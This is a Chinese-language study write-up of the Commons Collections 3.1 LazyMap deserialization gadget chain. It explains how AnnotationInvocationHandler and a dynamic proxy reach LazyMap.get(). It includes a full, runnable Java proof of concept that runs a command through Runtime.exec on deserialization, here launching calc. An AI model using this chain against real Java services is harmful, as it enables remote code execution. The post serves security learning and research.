# 前言

白天学习了`CommonsCollections1`的`TransformedMap`链，感觉打开了新世界的大门，所以晚上学习了`LazyMap`链，感觉也没那么难理解，可能是因为我在看CC链之前已经把基础知识都给过了一遍叭，所以才没那么困难。

# 环境

```xml
<dependencies>

    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.1</version>
    </dependency>

</dependencies>
```

`JDK`版本应该为`8u71`之前。

# 前置知识

和`TransformedMap`链相比，多出来的就是需要我们了解`LazyMap`还有动态代理。



## LazyMap

一个不是很难理解的类，直接看源码中的文档注释就可以理解了：

```java

/**
 * Decorates another <code>Map</code> to create objects in the map on demand.
 * <p>
 * When the {@link #get(Object)} method is called with a key that does not
 * exist in the map, the factory is used to create the object. The created
 * object will be added to the map using the requested key.
 * <p>
 * For instance:
 * <pre>
 * Factory factory = new Factory() {
 *     public Object create() {
 *         return new Date();
 *     }
 * }
 * Map lazy = Lazy.map(new HashMap(), factory);
 * Object obj = lazy.get("NOW");
 * </pre>
 *
 * After the above code is executed, <code>obj</code> will contain
 * a new <code>Date</code> instance. Furthermore, that <code>Date</code>
 * instance is mapped to the "NOW" key in the map.
 * <p>
 * This class is Serializable from Commons Collections 3.1.
 *
 * @since Commons Collections 3.0
 * @version $Revision: 1.7 $ $Date: 2004/05/07 23:30:33 $
 * 
 * @author Stephen Colebourne
 * @author Paul Jack
 */
public class LazyMap
        extends AbstractMapDecorator
        implements Map, Serializable {
```



当这个`Map`调用`get()`方法，而查找的`key`又不存在的情况下，这个工厂就会被用来创建新的对象，而且将被添加到这个map中。

和`TransformedMap`的用法也差不多，都是用来修饰一个`Map`的，看个例子就懂了：

```java
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap,new ConstantTransformer("feng"));
        Object value = outerMap.get("key");
        System.out.println(value);
```

会打印出`feng`字符串，很容易理解。



也可以尝试写一个命令执行：

```java
            Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Class.forName("java.lang.Runtime")),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"})
        } ;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap,chainedTransformer);
        outerMap.get("feng");
```





## 动态代理

之前学过了，这里就不再重复了，关于动态代理的文章：

https://blog.csdn.net/rfrder/article/details/119485265





# LazyMap链分析

之所以会用到动态代理，就是因为如果我们不用`TransformedMap`而用`LazyMap`的话，`AnnotationInvocationHandler`的`readObject`里面并没有用到`get()`，但是在`invoke()`方法中却用到了：

```java
    public Object invoke(Object var1, Method var2, Object[] var3) {
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
            return this.equalsImpl(var3[0]);
        } else if (var5.length != 0) {
            throw new AssertionError("Too many parameters for an annotation method");
        } else {
            byte var7 = -1;
            switch(var4.hashCode()) {
            case -1776922004:
                if (var4.equals("toString")) {
                    var7 = 0;
                }
                break;
            case 147696667:
                if (var4.equals("hashCode")) {
                    var7 = 1;
                }
                break;
            case 1444986633:
                if (var4.equals("annotationType")) {
                    var7 = 2;
                }
            }

            switch(var7) {
            case 0:
                return this.toStringImpl();
            case 1:
                return this.hashCodeImpl();
            case 2:
                return this.type;
            default:
                Object var6 = this.memberValues.get(var4);
                if (var6 == null) {
                    throw new IncompleteAnnotationException(this.type, var4);
                } else if (var6 instanceof ExceptionProxy) {
                    throw ((ExceptionProxy)var6).generateException();
                } else {
                    if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                        var6 = this.cloneArray(var6);
                    }

                    return var6;
                }
            }
        }
    }
```



先得到方法的名字和参数的类数组，再依次对方法名称的哈希值用`switch`判断，如果不是`equals,toString,hashCode和annotationType`的话，就会进入`default`：

```java
            default:
                Object var6 = this.memberValues.get(var4);
```



`memberValues`就是属性就是我们构造的被装饰后的`Map`，调用了`get()`方法，因此可以触发漏洞。

关键是反序列化怎么才能触发这个`invoke()`方法？注意到`AnnotationInvocationHandler`类实现了`InvocationHandler`类，看到这里我恍然大悟，怪不得和动态代理有关。实际上对动态代理熟一点的话，我看到这个类的名字也就该想到了。

因此大致的思路也就有了，用`AnnotationInvocationHandler`对我们构造的`Map`进行代理，这样在`readObject`中，只要调用了委托对象的任何方法，都会进入`AnnotationInvocationHandler#invoke `方法中，从而触发了漏洞。

构造一波`POC`：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections12 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Class.forName("java.lang.Runtime")),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"})
        } ;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();

        Map outerMap = LazyMap.decorate(innerMap,chainedTransformer);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)cons.newInstance(Retention.class, outerMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                handler
        );
        Object o = cons.newInstance(Retention.class, proxyMap);
        byte[] bytes = serialize(o);
        unserialize(bytes);
    }
    public static void unserialize(byte[] bytes) throws Exception{
        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
            ObjectInputStream oin = new ObjectInputStream(bain)){
            oin.readObject();
        }
    }

    public static byte[] serialize(Object o) throws Exception{
        try(ByteArrayOutputStream baout = new ByteArrayOutputStream();
            ObjectOutputStream oout = new ObjectOutputStream(baout)){
            oout.writeObject(o);
            return baout.toByteArray();
        }
    }
}


```





一个细节上的问题就是产生了代理的`proxyMap`后，还需要再利用它来生成一个`AnnotationInvocationHandler`对象，因为要序列化和反序列化的是`AnnotationInvocationHandler`对象。

![image-20210814201642919]([Java反序列化]CommonsCollections1利用链学习(下).assets/image-20210814201642919.png)



完美的弹出了计算机！

实际上，经过构造后，只要调用了`AnnotationInvocationHandler`的`memberValues`(也就是我们的`proxyMap`)的任何方法，都会触发漏洞。

# 版本问题

同样的，该POC只适用于`8u71`之前。

# 总结

`Java`的反序列化终于快入门了！冲冲冲！！！

如果还没理解的话，可能还是动态代理那一块没弄懂，动态代理那一块的逻辑懂了，剩下的就很简单了。





# 参考链接

Java安全漫谈 - 11.反序列化篇(5).pdf

https://y4tacker.blog.csdn.net/article/details/117448761

https://blog.csdn.net/rfrder/article/details/119485265

https://paper.seebug.org/1242/#commons-collections

https://www.cnblogs.com/throwable/p/9747595.html